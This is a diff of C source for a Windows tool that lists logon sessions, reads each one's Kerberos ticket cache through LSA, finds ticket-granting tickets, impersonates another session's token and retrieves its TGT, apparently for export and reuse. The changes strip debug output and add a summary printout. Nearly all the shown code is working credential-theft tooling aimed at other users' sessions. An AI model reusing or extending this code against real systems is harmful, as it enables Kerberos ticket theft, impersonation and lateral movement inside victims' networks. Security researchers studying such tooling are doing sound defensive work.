-        KERB_QUERY_TKT_CACHE_REQUEST req;
-        req.MessageType = KerbQueryTicketCacheMessage;
-        req.LogonId.LowPart = session_list[i].LowPart;
-        req.LogonId.HighPart = session_list[i].HighPart;
-
-        printf("[DEBUG] Checking session 0x%lx (%ls\\%ls)...\n",
-            (unsigned long)session_list[i].LowPart,
-            wcslen(dom) ? dom : L"?",
-            wcslen(usr) ? usr : L"?");
-
-        PKERB_QUERY_TKT_CACHE_RESPONSE rsp = NULL;
-        ULONG sz = 0;
-        NTSTATUS sub = 0;
-
-        NTSTATUS status = cal_fn(lsa, auth, &req, sizeof(req), (PVOID*)&rsp, &sz, &sub);
-
-        if (status == 0 && sub == 0 && rsp && rsp->CountOfTickets > 0) {
-            printf("[DEBUG]   -> Found %lu tickets\n", (unsigned long)rsp->CountOfTickets);
-
-            for (ULONG j = 0; j < rsp->CountOfTickets; j++) {
-                KERB_TICKET_CACHE_INFO* t = &rsp->Tickets[j];
-                wchar_t srv[512] = { 0 };
-
-                if (t->ServerName.Buffer && t->ServerName.Length > 0) {
-                    size_t len = t->ServerName.Length / sizeof(WCHAR);
-                    if (len > 511) len = 511;
-                    wcsncpy(srv, t->ServerName.Buffer, len);
-                    srv[len] = L'\0';
-                }
-
-                if (wcsstr(srv, L"krbtgt")) {
-                    printf("[DEBUG]   TGT found: %ls\n", srv);
-                    AddTGTToList(session_list[i].LowPart, usr, dom, srv);
-                }
-            }
-            fre_fn(rsp);
-        }
-        else if (status != 0 || sub != 0) {
-            printf("[DEBUG]   Query failed (Status: 0x%08lX, SubStatus: 0x%08lX)\n",
-                (unsigned long)status, (unsigned long)sub);
-        }
-        else {
-            printf("[DEBUG]   -> No tickets\n");
+        ULONG tickets_before = total_tickets;
+        EnumerateTicketsForSession(lsa, auth, session_list[i], session_data, cal_fn, fre_fn, TRUE, &total_tickets, &total_tgts);
+        
+        if (total_tickets > tickets_before) {
+            total_sessions_with_tickets++;
         }
 
         fre_fn(session_data);
     }
+
+    printf("\n");
+    PrintSeparator("SUMMARY");
+    printf("Total logon sessions analyzed: %lu\n", (unsigned long)session_cnt);
+    printf("Sessions with Kerberos tickets: %lu\n", (unsigned long)total_sessions_with_tickets);
+    printf("Total tickets found: %lu\n", (unsigned long)total_tickets);
+    printf("  - TGTs: %lu\n", (unsigned long)total_tgts);
+    printf("  - Service Tickets: %lu\n", (unsigned long)(total_tickets - total_tgts));
 
     if (g_tgtCount == 0) {
         printf("\nNo TGTs found on the system.\n");
@@ -1206,21 +1156,16 @@ void AutoExportAndImport() {
         return;
     }
 
-    // Ahora volvemos a consultar para encontrar el TGT específico
     KERB_QUERY_TKT_CACHE_REQUEST cacheReq;
     cacheReq.MessageType = KerbQueryTicketCacheMessage;
-    cacheReq.LogonId.LowPart = targetLuid.LowPart;  // CORRECTO: usar el LUID real
+    cacheReq.LogonId.LowPart = targetLuid.LowPart;
     cacheReq.LogonId.HighPart = targetLuid.HighPart;
-
-    printf("[DEBUG] Re-querying session 0x%lx to find TGT...\n", targetLogonId);
 
     PKERB_QUERY_TKT_CACHE_RESPONSE cacheRsp = NULL;
     ULONG sz = 0;
     NTSTATUS sub = 0;
 
     if (cal_fn(lsa, auth, &cacheReq, sizeof(cacheReq), (PVOID*)&cacheRsp, &sz, &sub) != 0 || sub != 0) {
-        printf("[DEBUG] Failed to re-query session (Status: 0x%08lX, SubStatus: 0x%08lX)\n",
-            (unsigned long)0, (unsigned long)sub);
         PrintError("Failed to get ticket cache");
         LsaDeregisterLogonProcess(lsa);
         fre_fn(session_list);
@@ -1246,7 +1191,6 @@ void AutoExportAndImport() {
             found = TRUE;
             wcsncpy(targetSrv, srv, 511);
             targetSrv[511] = L'\0';
-            printf("[DEBUG] Found TGT: %ls\n", targetSrv);
             break;
         }
     }
@@ -1260,22 +1204,13 @@ void AutoExportAndImport() {
         return;
     }
 
-    printf("[DEBUG] Impersonating session 0x%lx to retrieve TGT...\n", targetLogonId);
-
     HANDLE hImpToken = NULL;
     BOOL needRevert = FALSE;
 
     if (ImpersonateSession(targetLogonId, &hImpToken)) {
         if (ImpersonateLoggedOnUser(hImpToken)) {
             needRevert = TRUE;
-            printf("[DEBUG] Successfully impersonated\n");
         }
-        else {
-            printf("[DEBUG] ImpersonateLoggedOnUser failed\n");
-        }
-    }
-    else {
-        printf("[DEBUG] ImpersonateSession failed\n");
     }
 
     ULONG reqSize = (ULONG)(sizeof(KERB_RETRIEVE_TKT_REQUEST) + (wcslen(targetSrv) * sizeof(WCHAR)));
@@ -1317,7 +1252,6 @@ void AutoExportAndImport() {
     if (needRevert) {
         RevertToSelf();
         CloseHandle(hImpToken);
-        printf("[DEBUG] Reverted impersonation\n");
     }
 
     if (retStatus != 0 || sub != 0) {
